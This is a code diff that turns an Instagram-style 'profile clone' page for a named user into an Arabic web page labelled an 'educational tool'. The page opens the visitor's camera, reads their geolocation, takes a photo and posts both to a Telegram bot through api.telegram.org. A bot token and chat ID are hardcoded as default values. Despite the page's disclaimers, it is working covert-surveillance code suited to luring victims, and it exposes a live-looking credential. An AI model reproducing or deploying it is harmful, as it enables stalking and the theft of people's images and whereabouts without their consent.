@@ -2,30 +2,242 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Khaled_altweel99 - Profile Clone</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>أداة تعليمية - كاميرا + موقع + تلغرام</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fafafa; }
-        .profile-container { max-width: 935px; margin: 0 auto; padding: 20px; }
-        .header { display: flex; align-items: center; gap: 50px; }
-        .avatar { width: 150px; height: 150px; border-radius: 50%; background: #dbdbdb; }
-        .info h1 { font-size: 28px; font-weight: 300; }
-        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 28px; margin-top: 50px; }
-        .post { aspect-ratio: 1/1; background: #efefef; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #0a0f1e;
+            color: #eee;
+            direction: rtl;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #1e2a3a;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        video, canvas {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 15px;
+            margin: 10px 0;
+            border: 2px solid #00d8ff;
+        }
+        button {
+            background: #00d8ff;
+            border: none;
+            padding: 12px 25px;
+            margin: 10px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #00a2cc;
+            transform: scale(1.02);
+        }
+        .warning {
+            background: #ff9800;
+            color: #000;
+            padding: 10px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .status {
+            background: #111;
+            padding: 8px;
+            border-radius: 8px;
+            font-family: monospace;
+            margin-top: 15px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            direction: ltr;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <div class="profile-container">
-        <div class="header">
-            <div class="avatar"></div>
-            <div class="info">
-                <h1>Khaled_altweel99</h1>
-            </div>
-        </div>
-        <div class="grid">
-            <div class="post"></div>
-            <div class="post"></div>
-            <div class="post"></div>
-        </div>
+
+<div class="container">
+    <h2>⚠️ أداة تعليمية فقط ⚠️</h2>
+    <p>هذه الأداة تعمل <strong>على جهازك أنت شخصيًا</strong> بعد أخذ الإذن منك.<br>
+    استخدامها على شخص آخر دون موافقته <span style="color:red">غير قانوني</span>.</p>
+    
+    <div class="warning">
+        📌 ستطلب الصفحة صلاحيات: الكاميرا + الموقع الجغرافي<br>
+        📤 سيتم إرسال الصورة + الموقع إلى بوت تلغرام <strong>تملكه أنت</strong>
     </div>
+
+    <h3>🎥 معاينة الكاميرا</h3>
+    <video id="video" autoplay playsinline></video>
+    <br>
+    <button id="snap">📸 التقاط الصورة + إرسال للموقع</button>
+
+    <h3>📡 بيانات البوت (عدلها حسب بوتك)</h3>
+    <input type="text" id="botToken" placeholder="توكن البوت" value="8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg">
+    <input type="text" id="chatId" placeholder="معرف الشات (ID)" value="7214473798">
+    
+    <div class="status" id="status">⚪ في انتظار السماح للكاميرا والموقع...</div>
+</div>
+
+<script>
+    // عناصر DOM
+    const video = document.getElementById('video');
+    const snapBtn = document.getElementById('snap');
+    const statusDiv = document.getElementById('status');
+    const botTokenInput = document.getElementById('botToken');
+    const chatIdInput = document.getElementById('chatId');
+
+    let stream = null;
+    let currentLocation = null;
+
+    // ----- طلب صلاحية الكاميرا -----
+    async function initCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            statusDiv.innerHTML = '✅ الكاميرا جاهزة. جارِ تحديد الموقع...';
+            getLocation();
+        } catch (err) {
+            statusDiv.innerHTML = '❌ لا يمكن الوصول للكاميرا: ' + err.message;
+            console.error(err);
+        }
+    }
+
+    // ----- طلب صلاحية الموقع الجغرافي -----
+    function getLocation() {
+        if (!navigator.geolocation) {
+            statusDiv.innerHTML += '<br>⚠️ المتصفح لا يدعم تحديد الموقع. سيتم الإرسال بدون موقع.';
+            currentLocation = null;
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                currentLocation = { lat, lon };
+                statusDiv.innerHTML = `✅ الكاميرا جاهزة. 🗺️ الموقع: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+            },
+            (err) => {
+                statusDiv.innerHTML += '<br>⚠️ فشل تحديد الموقع: ' + err.message + '. سيتم الإرسال بدون موقع.';
+                currentLocation = null;
+            }
+        );
+    }
+
+    // ----- التقاط الصورة (canvas) -----
+    function capturePhoto() {
+        if (!video.srcObject) {
+            alert("الكاميرا غير جاهزة بعد.");
+            return null;
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.8);  // Base64 JPEG
+    }
+
+    // ----- إرسال الصورة + الموقع إلى تلغرام -----
+    async function sendToTelegram(imageBase64, location, botToken, chatId) {
+        // 1. إرسال الصورة كملف
+        const blob = dataURLtoBlob(imageBase64);
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'snapshot.jpg');
+
+        let photoOk = false;
+        try {
+            const photoRes = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            const photoJson = await photoRes.json();
+            photoOk = photoJson.ok;
+            if (!photoOk) throw new Error(photoJson.description);
+        } catch (err) {
+            statusDiv.innerHTML = `❌ فشل إرسال الصورة: ${err.message}`;
+            return false;
+        }
+
+        // 2. إرسال الموقع كنص إذا كان موجوداً
+        if (location) {
+            const locationText = `📍 الموقع التقريبي:\nhttps://maps.google.com/?q=${location.lat},${location.lon}\nخط العرض: ${location.lat}\nخط الطول: ${location.lon}`;
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: locationText
+                    })
+                });
+            } catch(e) { console.warn("فشل إرسال نص الموقع", e); }
+        }
+        return true;
+    }
+
+    // مساعدة: تحويل Base64 إلى Blob
+    function dataURLtoBlob(dataURL) {
+        const arr = dataURL.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+        return new Blob([u8arr], { type: mime });
+    }
+
+    // ----- حدث النقر على زر التصوير والإرسال -----
+    snapBtn.onclick = async () => {
+        const botToken = botTokenInput.value.trim();
+        const chatId = chatIdInput.value.trim();
+
+        if (!botToken || !chatId) {
+            statusDiv.innerHTML = '⚠️ أدخل توكن البوت ورقم الشات أولاً.';
+            return;
+        }
+
+        statusDiv.innerHTML = '📸 جارِ التقاط الصورة...';
+        const imageData = capturePhoto();
+        if (!imageData) {
+            statusDiv.innerHTML = '❌ فشل التقاط الصورة. تأكد من الكاميرا.';
+            return;
+        }
+
+        statusDiv.innerHTML = '📤 جارِ الإرسال إلى تلغرام...';
+        const success = await sendToTelegram(imageData, currentLocation, botToken, chatId);
+        if (success) {
+            statusDiv.innerHTML = '✅ تم الإرسال بنجاح! (صورة + موقع إن وُجد)';
+        } else {
+            statusDiv.innerHTML = '❌ فشل الإرسال. تحقق من التوكن ومعرف الشات.';
+        }
+    };
+
+    // بدء التشغيل
+    initCamera();
+
+    // تنظيف الكاميرا عند إغلاق الصفحة (اختياري)
+    window.addEventListener('beforeunload', () => {
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+        }
+    });
+</script>
+
 </body>
 </html>
